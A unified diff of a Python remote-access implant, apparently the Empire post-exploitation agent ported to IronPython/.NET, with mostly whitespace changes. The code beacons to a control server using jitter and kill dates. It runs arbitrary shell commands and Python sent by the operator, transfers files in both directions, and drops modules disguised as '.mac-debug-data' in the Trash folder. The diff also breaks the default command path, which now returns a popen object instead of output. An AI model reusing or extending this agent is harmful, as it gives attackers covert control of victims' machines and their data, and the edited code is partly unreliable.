@@ -16,15 +16,16 @@ import importlib.util
 import types
 import re
 import shutil
-import pwd
 import socket
 import math
 import stat
-import grp
 import numbers
 from os.path import expanduser
 from io import StringIO
 from threading import Thread
+import platform
+from System import Environment
+
 
 ################################################
 #
@@ -64,6 +65,7 @@ jobs = []
 moduleRepo = {}
 _meta_cache = {}
 
+
 # global header dictionary
 #   sessionID is set by stager.py
 # headers = {'User-Agent': userAgent, "Cookie": "SESSIONID=%s" %(sessionID)}
@@ -76,11 +78,12 @@ for headerRaw in headersRaw:
         headerValue = headerRaw.split(":")[1]
 
         if headerKey.lower() == "cookie":
-            headers['Cookie'] = "%s;%s" % (headers['Cookie'], headerValue)
+            headers['Cookie'] = "%s;%s" %(headers['Cookie'], headerValue)
         else:
             headers[headerKey] = headerValue
     except:
         pass
+
 
 ################################################
 #
@@ -139,14 +142,14 @@ def build_response_packet(taskingID, packetData, resultID=0):
     resultID = struct.pack('=H', resultID)
 
     if packetData:
-        if (isinstance(packetData, str)):
+        if(isinstance(packetData, str)):
             packetData = base64.b64encode(packetData.encode('utf-8', 'ignore'))
         else:
-            packetData = base64.b64encode(packetData.decode('utf-8').encode('utf-8', 'ignore'))
+            packetData = base64.b64encode(packetData.decode('utf-8').encode('utf-8','ignore'))
         if len(packetData) % 4:
             packetData += '=' * (4 - len(packetData) % 4)
 
-        length = struct.pack('=L', len(packetData))
+        length = struct.pack('=L',len(packetData))
         return packetType + totalPacket + packetNum + resultID + length + packetData
     else:
         length = struct.pack('=L', 0)
@@ -177,21 +180,21 @@ def parse_task_packet(packet, offset=0):
 
     # print "parse_task_packet"
 
-    if (isinstance(packet, str)):
+    if(isinstance(packet, str)):
         packet = packet.encode('UTF-8')
 
     try:
-        packetType = struct.unpack('=H', packet[0 + offset:2 + offset])[0]
-        totalPacket = struct.unpack('=H', packet[2 + offset:4 + offset])[0]
-        packetNum = struct.unpack('=H', packet[4 + offset:6 + offset])[0]
-        resultID = struct.unpack('=H', packet[6 + offset:8 + offset])[0]
-        length = struct.unpack('=L', packet[8 + offset:12 + offset])[0]
-        packetData = packet[12 + offset:12 + offset + length].decode('UTF-8')
-        remainingData = packet[12 + offset + length:].decode('UTF-8')
+        packetType = struct.unpack('=H', packet[0+offset:2+offset])[0]
+        totalPacket = struct.unpack('=H', packet[2+offset:4+offset])[0]
+        packetNum = struct.unpack('=H', packet[4+offset:6+offset])[0]
+        resultID = struct.unpack('=H', packet[6+offset:8+offset])[0]
+        length = struct.unpack('=L', packet[8+offset:12+offset])[0]
+        packetData = packet[12+offset:12+offset+length].decode('UTF-8')
+        remainingData = packet[12+offset+length:].decode('UTF-8')
 
         return (packetType, totalPacket, packetNum, resultID, length, packetData, remainingData)
     except Exception as e:
-        print("parse_task_packet exception:", e)
+        print("parse_task_packet exception:",e)
         return (None, None, None, None, None, None, None)
 
 
@@ -217,14 +220,13 @@ def process_tasking(data):
 
         packetOffset = 12 + length
         while remainingData and remainingData != '':
-            (packetType, totalPacket, packetNum, resultID, length, data, remainingData) = parse_task_packet(tasking,
-                                                                                                            offset=packetOffset)
+            (packetType, totalPacket, packetNum, resultID, length, data, remainingData) = parse_task_packet(tasking, offset=packetOffset)
             result = process_packet(packetType, data, resultID)
             if result:
                 resultPackets += result
 
             packetOffset += 12 + length
-
+        
         # send_message() is patched in from the listener module
         send_message(resultPackets)
 
@@ -244,12 +246,13 @@ def process_job_tasking(result):
         # send packets
         send_message(resultPackets)
     except Exception as e:
-        print("processJobTasking exception:", e)
+        print("processJobTasking exception:",e)
         pass
 
 
 def process_packet(packetType, data, resultID):
-    if (isinstance(data, bytes)):
+
+    if(isinstance(data, bytes)):
         data = data.decode('UTF-8')
     try:
         packetType = int(packetType)
@@ -271,12 +274,12 @@ def process_packet(packetType, data, resultID):
         if len(parts) == 1:
             data = parts[0]
             resultData = str(run_command(data))
-            send_message(build_response_packet(40, resultData + "\r\n ..Command execution completed.", resultID))
+            send_message(build_response_packet(40, resultData + "\r", resultID))
         else:
             cmd = parts[0]
             cmdargs = ' '.join(parts[1:len(parts)])
             resultData = str(run_command(cmd, cmdargs=cmdargs))
-            send_message(build_response_packet(40, resultData + "\r\n ..Command execution completed.", resultID))
+            send_message(build_response_packet(40, resultData + "\r", resultID))
 
     elif packetType == 41:
         # file download
@@ -291,7 +294,7 @@ def process_packet(packetType, data, resultID):
             # recursive dir listing
             for folder, subs, files in os.walk(objPath):
                 for filename in files:
-                    # dont care about symlinks
+                    #dont care about symlinks
                     if os.path.exists(objPath):
                         fileList.append(objPath + "/" + filename)
 
@@ -302,31 +305,31 @@ def process_packet(packetType, data, resultID):
 
             while True:
 
-                # get 512kb of the given file starting at the specified offset
-                encodedPart = get_file_part(filePath, offset=offset, base64=False)
-                c = compress()
-                start_crc32 = c.crc32_data(encodedPart)
-                comp_data = c.comp_data(encodedPart)
-                encodedPart = c.build_header(comp_data, start_crc32)
-                encodedPart = base64.b64encode(encodedPart).decode('UTF-8')
+                 # get 512kb of the given file starting at the specified offset
+                 encodedPart = get_file_part(filePath, offset=offset, base64=False)
+                 c = compress()
+                 start_crc32 = c.crc32_data(encodedPart)
+                 comp_data = c.comp_data(encodedPart)
+                 encodedPart = c.build_header(comp_data, start_crc32)
+                 encodedPart = base64.b64encode(encodedPart).decode('UTF-8')
 
-                partData = "%s|%s|%s|%s" % (partIndex, filePath, size, encodedPart)
-                if not encodedPart or encodedPart == '' or len(encodedPart) == 16:
-                    break
+                 partData = "%s|%s|%s|%s" %(partIndex, filePath, size, encodedPart)
+                 if not encodedPart or encodedPart == '' or len(encodedPart) == 16:
+                     break
 
-                send_message(build_response_packet(41, partData, resultID))
+                 send_message(build_response_packet(41, partData, resultID))
 
-                global delay
-                global jitter
-                if jitter < 0: jitter = -jitter
-                if jitter > 1: jitter = old_div(1, jitter)
+                 global delay
+                 global jitter
+                 if jitter < 0: jitter = -jitter
+                 if jitter > 1: jitter = old_div(1,jitter)
 
-                minSleep = int((1.0 - jitter) * delay)
-                maxSleep = int((1.0 + jitter) * delay)
-                sleepTime = random.randint(minSleep, maxSleep)
-                time.sleep(sleepTime)
-                partIndex += 1
-                offset += 512000
+                 minSleep = int((1.0-jitter)*delay)
+                 maxSleep = int((1.0+jitter)*delay)
+                 sleepTime = random.randint(minSleep, maxSleep)
+                 time.sleep(sleepTime)
+                 partIndex += 1
+                 offset += 512000
 
     elif packetType == 42:
         # file upload
@@ -338,22 +341,15 @@ def process_packet(packetType, data, resultID):
             d = decompress()
             dec_data = d.dec_data(raw, cheader=True)
             if not dec_data['crc32_check']:
-                send_message(
-                    build_response_packet(0, "[!] WARNING: File upload failed crc32 check during decompressing!.",
-                                          resultID))
-                send_message(build_response_packet(0,
-                                                   "[!] HEADER: Start crc32: %s -- Received crc32: %s -- Crc32 pass: %s!." % (
-                                                   dec_data['header_crc32'], dec_data['dec_crc32'],
-                                                   dec_data['crc32_check']), resultID))
+                send_message(build_response_packet(0, "[!] WARNING: File upload failed crc32 check during decompressing!.", resultID))
+                send_message(build_response_packet(0, "[!] HEADER: Start crc32: %s -- Received crc32: %s -- Crc32 pass: %s!." %(dec_data['header_crc32'],dec_data['dec_crc32'],dec_data['crc32_check']), resultID))
             f = open(filePath, 'ab')
             f.write(dec_data['data'])
             f.close()
 
-            send_message(build_response_packet(42, "[*] Upload of %s successful" % (filePath), resultID))
+            send_message(build_response_packet(42, "[*] Upload of %s successful" %(filePath), resultID))
         except Exception as e:
-            sendec_datadMessage(
-                build_response_packet(0, "[!] Error in writing file %s during upload: %s" % (filePath, str(e)),
-                                      resultID))
+            sendec_datadMessage(build_response_packet(0, "[!] Error in writing file %s during upload: %s" %(filePath, str(e)), resultID))
 
     elif packetType == 43:
         # directory list
@@ -387,7 +383,7 @@ def process_packet(packetType, data, resultID):
         else:
             msg = "Active jobs:\n"
             for x in range(len(jobs)):
-                msg += "\t%s" % (x)
+                msg += "\t%s" %(x)
         send_message(build_response_packet(50, msg, resultID))
 
     elif packetType == 51:
@@ -403,7 +399,7 @@ def process_packet(packetType, data, resultID):
             if result and result != "":
                 send_message(build_response_packet(51, result, resultID))
         except:
-            return build_response_packet(0, "error stopping job: %s" % (data), resultID)
+            return build_response_packet(0, "error stopping job: %s" %(data), resultID)
 
     elif packetType == 100:
         # dynamic code execution, wait for output, don't save outputPicl
@@ -416,9 +412,8 @@ def process_packet(packetType, data, resultID):
             results = buffer.getvalue()
             send_message(build_response_packet(100, str(results), resultID))
         except Exception as e:
-            errorData = str(buffer.getvalue())
-            return build_response_packet(0, "error executing specified Python data: %s \nBuffer data recovered:\n%s" % (
-            e, errorData), resultID)
+           errorData = str(buffer.getvalue())
+           return build_response_packet(0, "error executing specified Python data: %s \nBuffer data recovered:\n%s" %(e, errorData), resultID)
 
     elif packetType == 101:
         # dynamic code execution, wait for output, save output
@@ -437,15 +432,11 @@ def process_packet(packetType, data, resultID):
             comp_data = c.comp_data(results)
             encodedPart = c.build_header(comp_data, start_crc32)
             encodedPart = base64.b64encode(encodedPart).decode('UTF-8')
-            send_message(
-                build_response_packet(101, '{0: <15}'.format(prefix) + '{0: <5}'.format(extension) + encodedPart,
-                                      resultID))
+            send_message(build_response_packet(101, '{0: <15}'.format(prefix) + '{0: <5}'.format(extension) + encodedPart, resultID))
         except Exception as e:
             # Also return partial code that has been executed
             errorData = buffer.getvalue()
-            send_message(build_response_packet(0,
-                                               "error executing specified Python data %s \nBuffer data recovered:\n%s" % (
-                                               e, errorData), resultID))
+            send_message(build_response_packet(0, "error executing specified Python data %s \nBuffer data recovered:\n%s" %(e, errorData), resultID))
 
     elif packetType == 102:
         # on disk code execution for modules that require multiprocessing not supported by exec
@@ -453,19 +444,19 @@ def process_packet(packetType, data, resultID):
             implantHome = expanduser("~") + '/.Trash/'
             moduleName = ".mac-debug-data"
             implantPath = implantHome + moduleName
-            result = "[*] Module disk path: %s \n" % (implantPath)
+            result = "[*] Module disk path: %s \n" %(implantPath)
             with open(implantPath, 'w') as f:
                 f.write(data)
             result += "[*] Module properly dropped to disk \n"
-            pythonCommand = "python %s" % (implantPath)
+            pythonCommand = "python %s" %(implantPath)
             process = subprocess.Popen(pythonCommand, stdout=subprocess.PIPE, shell=True)
             data = process.communicate()
             result += data[0].strip()
             try:
                 os.remove(implantPath)
-                result += "[*] Module path was properly removed: %s" % (implantPath)
+                result += "[*] Module path was properly removed: %s" %(implantPath)
             except Exception as e:
-                print("error removing module filed: %s" % (e))
+                print("error removing module filed: %s" %(e))
             fileCheck = os.path.isfile(implantPath)
             if fileCheck:
                 result += "\n\nError removing module file, please verify path: " + str(implantPath)
@@ -473,14 +464,12 @@ def process_packet(packetType, data, resultID):
         except Exception as e:
             fileCheck = os.path.isfile(implantPath)
             if fileCheck:
-                send_message(build_response_packet(0,
-                                                   "error executing specified Python data: %s \nError removing module file, please verify path: %s" % (
-                                                   e, implantPath), resultID))
-            send_message(build_response_packet(0, "error executing specified Python data: %s" % (e), resultID))
+                send_message(build_response_packet(0, "error executing specified Python data: %s \nError removing module file, please verify path: %s" %(e, implantPath), resultID))
+            send_message(build_response_packet(0, "error executing specified Python data: %s" %(e), resultID))
 
     elif packetType == 110:
         start_job(data)
-        send(build_response_packet(110, "job %s started" % (len(jobs) - 1), resultID))
+        send(build_response_packet(110, "job %s started" %(len(jobs)-1), resultID))
 
     elif packetType == 111:
         # TASK_CMD_JOB_SAVE
@@ -488,7 +477,7 @@ def process_packet(packetType, data, resultID):
         pass
 
     elif packetType == 121:
-        # base64 decode the script and execute
+        #base64 decode the script and execute
         script = base64.b64decode(data)
         try:
             buffer = StringIO()
@@ -500,12 +489,10 @@ def process_packet(packetType, data, resultID):
             send_message(build_response_packet(121, result, resultID))
         except Exception as e:
             errorData = str(buffer.getvalue())
-            send_message(build_response_packet(0,
-                                               "error executing specified Python data %s \nBuffer data recovered:\n%s" % (
-                                               e, errorData), resultID))
+            send_message(build_response_packet(0, "error executing specified Python data %s \nBuffer data recovered:\n%s" %(e, errorData), resultID))
 
     elif packetType == 122:
-        # base64 decode and decompress the data
+        #base64 decode and decompress the data
         try:
             parts = data.split('|')
             base64part = parts[1]
@@ -528,18 +515,18 @@ def process_packet(packetType, data, resultID):
             send_message(build_response_packet(122, "Successfully imported %s" % (fileName), resultID))
 
     elif packetType == 123:
-        # view loaded modules
+        #view loaded modules
         repoName = data
         if repoName == "":
             loadedModules = "\nAll Repos\n"
             for key, value in list(moduleRepo.items()):
-                loadedModules += "\n----" + key + "----\n"
+                loadedModules += "\n----"+key+"----\n"
                 loadedModules += '\n'.join(moduleRepo[key].namelist())
 
             send_message(build_response_packet(123, loadedModules, resultID))
         else:
             try:
-                loadedModules = "\n----" + repoName + "----\n"
+                loadedModules = "\n----"+repoName+"----\n"
                 loadedModules += '\n'.join(moduleRepo[repoName].namelist())
                 send_message(build_response_packet(123, loadedModules, resultID))
             except Exception as e:
@@ -547,7 +534,7 @@ def process_packet(packetType, data, resultID):
                 send_message(build_response_packet(123, msg, resultID))
 
     elif packetType == 124:
-        # remove module
+        #remove module
         repoName = data
         try:
             remove_hook(repoName)
@@ -557,8 +544,7 @@ def process_packet(packetType, data, resultID):
             send_message(build_response_packet(124, "Unable to remove repo: %s, %s" % (repoName, str(e)), resultID))
 
     else:
-        send_message(build_response_packet(0, "invalid tasking ID: %s" % (taskingID), resultID))
-
+        send_message(build_response_packet(0, "invalid tasking ID: %s" %(taskingID), resultID))
 
 def old_div(a, b):
     """
@@ -569,7 +555,6 @@ def old_div(a, b):
         return a // b
     else:
         return a / b
-
 
 ################################################
 #
@@ -582,17 +567,14 @@ def old_div(a, b):
 # [1] = /__init__.py ext, is_package = True
 _search_order = [('.py', False), ('/__init__.py', True)]
 
-
 class ZipImportError(ImportError):
     """Exception raised by zipimporter objects."""
-
 
 # _get_info() = takes the fullname, then subpackage name (if applicable),
 # and searches for the respective module or package
 
 class CFinder(object):
     """Import Hook for Empire"""
-
     def __init__(self, repoName):
         self.repoName = repoName
 
@@ -602,8 +584,7 @@ class CFinder(object):
         submodule = parts[-1]
         modulepath = '/'.join(parts)
 
-        # check to see if that specific module exists
-
+        #check to see if that specific module exists
         for suffix, is_package in _search_order:
             relpath = modulepath + suffix
             try:
@@ -613,7 +594,7 @@ class CFinder(object):
             else:
                 return submodule, is_package, relpath
 
-        # Error out if we can find the module/package
+        #Error out if we can find the module/package
         msg = ('Unable to locate module %s in the %s repo' % (submodule, repoName))
         raise ZipImportError(msg)
 
@@ -624,7 +605,6 @@ class CFinder(object):
         source = moduleRepo[repoName].read(relpath)
         source = source.replace('\r\n', '\n')
         source = source.replace('\r', '\n')
-
         return submodule, is_package, fullpath, source
 
     def find_module(self, fullname, path=None):
@@ -679,13 +659,13 @@ class CFinder(object):
             finder = _meta_cache.pop(repoName)
             sys.meta_path.remove(finder)
 
-
 ################################################
 #
 # misc methods
 #
 ################################################
 class compress(object):
+
     '''
     Base clase for init of the package. This will handle
     the initial object creation for conducting basic functions.
@@ -707,7 +687,7 @@ class compress(object):
         data = string wanting compression
         cvalue = 0-9 comp value (default 6)
         '''
-        cdata = zlib.compress(data, cvalue)
+        cdata = zlib.compress(data,cvalue)
         return cdata
 
     def crc32_data(self, data):
@@ -727,12 +707,12 @@ class compress(object):
         data =  comp data
         crc = crc32 value
         '''
-        header = struct.pack("!I", crc)
+        header = struct.pack("!I",crc)
         built_data = header + data
         return built_data
 
-
 class decompress(object):
+
     '''
     Base clase for init of the package. This will handle
     the initial object creation for conducting basic functions.
@@ -765,11 +745,10 @@ class decompress(object):
                 crc32 = True
             else:
                 crc32 = False
-            return {"header_crc32": comp_crc32, "dec_crc32": dec_crc32, "crc32_check": crc32, "data": dec_data}
+            return { "header_crc32" : comp_crc32, "dec_crc32" : dec_crc32, "crc32_check" : crc32, "data" : dec_data }
         else:
             dec_data = zlib.decompress(data)
             return dec_data
-
 
 def agent_exit():
     # exit for proper job / thread cleanup
@@ -783,10 +762,9 @@ def agent_exit():
             pass
     exit()
 
-
 def indent(lines, amount=4, ch=' '):
     padding = amount * ch
-    return padding + ('\n' + padding).join(lines.split('\n'))
+    return padding + ('\n'+padding).join(lines.split('\n'))
 
 
 # from http://stackoverflow.com/questions/6893968/how-to-get-the-return-value-from-a-thread-in-python
@@ -795,18 +773,17 @@ class ThreadWithReturnValue(Thread):
                  args=(), kwargs={}, Verbose=None):
         Thread.__init__(self, group, target, name, args, kwargs, Verbose)
         self._return = None
-
     def run(self):
         if self._Thread__target is not None:
             self._return = self._Thread__target(*self._Thread__args,
                                                 **self._Thread__kwargs)
-
     def join(self):
         Thread.join(self)
         return self._return
 
 
 class KThread(threading.Thread):
+
     """A subclass of threading.Thread, with a kill()
   method."""
 
@@ -817,7 +794,7 @@ class KThread(threading.Thread):
     def start(self):
         """Start the thread."""
         self.__run_backup = self.run
-        self.run = self.__run  # Force the Thread toinstall our trace.
+        self.run = self.__run      # Force the Thread toinstall our trace.
         threading.Thread.start(self)
 
     def __run(self):
@@ -844,11 +821,11 @@ class KThread(threading.Thread):
 
 
 def start_job(code):
+
     global jobs
 
     # create a new code block with a defined method name
     codeBlock = "def method():\n" + indent(code)
-
     # register the code block
     code_obj = compile(codeBlock, '<string>', 'exec')
     # code needs to be in the global listing
@@ -856,7 +833,7 @@ def start_job(code):
     exec(code_obj, globals())
 
     # create/processPacketstart/return the thread
-    # call the job_func so sys data can be cpatured
+    # call the job_func so sys data can be captured
     codeThread = KThread(target=job_func)
     codeThread.start()
 
@@ -872,13 +849,13 @@ def job_func():
         method()
         sys.stdout = old_stdout
         dataStats_2 = mystdout.getvalue()
+        print(dataStats_2)
         result = build_response_packet(110, str(dataStats_2))
         process_job_tasking(result)
     except Exception as e:
         p = "error executing specified Python job data: " + str(e)
         result = build_response_packet(0, p)
         process_job_tasking(result)
-
 
 def job_message_buffer(message):
     # Supports job messages for checkin
@@ -889,7 +866,6 @@ def job_message_buffer(message):
     except Exception as e:
         print(e)
 
-
 def get_job_message_buffer():
     global jobMessageBuffer
     try:
@@ -897,8 +873,7 @@ def get_job_message_buffer():
         jobMessageBuffer = ""
         return result
     except Exception as e:
-        return build_response_packet(0, "[!] Error getting job output: %s" % (e))
-
+        return build_response_packet(0, "[!] Error getting job output: %s" %(e))
 
 def send_job_message_buffer():
     if len(jobs) > 0:
@@ -907,13 +882,11 @@ def send_job_message_buffer():
     else:
         pass
 
-
 def start_webserver(data, ip, port, serveCount):
     # thread data_webserver for execution
     t = threading.Thread(target=data_webserver, args=(data, ip, port, serveCount))
     t.start()
     return
-
 
 def data_webserver(data, ip, port, serveCount):
     # hosts a file on port and IP servers data string
@@ -922,7 +895,6 @@ def data_webserver(data, ip, port, serveCount):
     data = str(data)
     serveCount = int(serveCount)
     count = 0
-
     class serverHandler(http.server.BaseHTTPRequestHandler):
         def do_GET(s):
             """Respond to a GET request."""
@@ -930,10 +902,8 @@ def data_webserver(data, ip, port, serveCount):
             s.send_header("Content-type", "text/html")
             s.end_headers()
             s.wfile.write(data)
-
         def log_message(s, format, *args):
             return
-
     server_class = http.server.HTTPServer
     httpServer = server_class((hostName, portNumber), serverHandler)
     try:
@@ -944,7 +914,6 @@ def data_webserver(data, ip, port, serveCount):
         pass
     httpServer.server_close()
     return
-
 
 def permissions_to_unix_name(st_mode):
     permstr = ''
@@ -958,7 +927,6 @@ def permissions_to_unix_name(st_mode):
             else:
                 permstr += '-'
     return permstr
-
 
 def directory_listing(path):
     # directory listings in python
@@ -974,8 +942,9 @@ def directory_listing(path):
         else:
             permstr = "-{}".format(permstr)
 
-        user = pwd.getpwuid(fstat.st_uid)[0]
-        group = grp.getgrgid(fstat.st_gid)[0]
+        user = Environment.UserName
+        # Needed?
+        group = "Users"
 
         # Convert file size to MB, KB or Bytes
         if (fstat.st_size > 1024 * 1024):
@@ -990,10 +959,9 @@ def directory_listing(path):
 
         mtime = time.strftime("%X %x", time.gmtime(fstat.st_mtime))
 
-        res += '{} {} {} {:18s} {:f} {:2s} {:15.15s}\n'.format(permstr, user, group, mtime, fsize, unit, fn)
+        res += '{} {} {} {:18s} {:f} {:2s} {:15.15s}\n'.format(permstr,user,group,mtime,fsize,unit,fn)
 
     return res
-
 
 # additional implementation methods
 def run_command(command, cmdargs=None):
@@ -1010,7 +978,7 @@ def run_command(command, cmdargs=None):
     elif re.compile("rm").match(command):
         if cmdargs == None:
             return "please provide a file or directory"
-
+        
         if os.path.exists(cmdargs):
             if os.path.isfile(cmdargs):
                 os.remove(cmdargs)
@@ -1030,20 +998,20 @@ def run_command(command, cmdargs=None):
         return "Created directory: {}".format(cmdargs)
 
     elif re.compile("(whoami|getuid)").match(command):
-        return pwd.getpwuid(os.getuid())[0]
+        return Environment.UserName
 
     elif re.compile("hostname").match(command):
         return str(socket.gethostname())
 
+    elif re.compile("ps").match(command):
+        return os.popen('tasklist').read()
     else:
-        if cmdargs != None:
-            command = "{} {}".format(command, cmdargs)
-
-        p = subprocess.Popen(command, stdin=None, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
-        return p.communicate()[0].strip().decode('UTF-8')
+        command = "{} {}".format(command, cmdargs)
+        return os.popen(command)
 
 
 def get_file_part(filePath, offset=0, chunkSize=512000, base64=True):
+
     if not os.path.exists(filePath):
         return ''
 
@@ -1056,18 +1024,17 @@ def get_file_part(filePath, offset=0, chunkSize=512000, base64=True):
     else:
         return data
 
-
 ################################################
 #
 # main agent functionality
 #
 ################################################
 
-while (True):
+while(True):
     try:
         if workingHours != '' and 'WORKINGHOURS' not in workingHours:
             try:
-                start, end = workingHours.split('-')
+                start,end = workingHours.split('-')
                 now = datetime.datetime.now()
                 startTime = datetime.datetime.strptime(start, "%H:%M")
                 endTime = datetime.datetime.strptime(end, "%H:%M")
@@ -1088,9 +1055,9 @@ while (True):
                 killDateTime = datetime.datetime.strptime(killDate, "%m/%d/%Y").date()
             except:
                 pass
-
+            
             if now >= killDateTime:
-                msg = "[!] Agent %s exiting" % (sessionID)
+                msg = "[!] Agent %s exiting" %(sessionID)
                 send_message(build_response_packet(2, msg))
                 agent_exit()
 
@@ -1100,9 +1067,9 @@ while (True):
 
         # sleep for the randomized interval
         if jitter < 0: jitter = -jitter
-        if jitter > 1: jitter = old_div(1, jitter)
-        minSleep = int((1.0 - jitter) * delay)
-        maxSleep = int((1.0 + jitter) * delay)
+        if jitter > 1: jitter = old_div(1,jitter)
+        minSleep = int((1.0-jitter)*delay)
+        maxSleep = int((1.0+jitter)*delay)
 
         sleepTime = random.randint(minSleep, maxSleep)
         time.sleep(sleepTime)
@@ -1125,3 +1092,4 @@ while (True):
 
     except Exception as e:
         print("main() exception: %s" % (e))
+
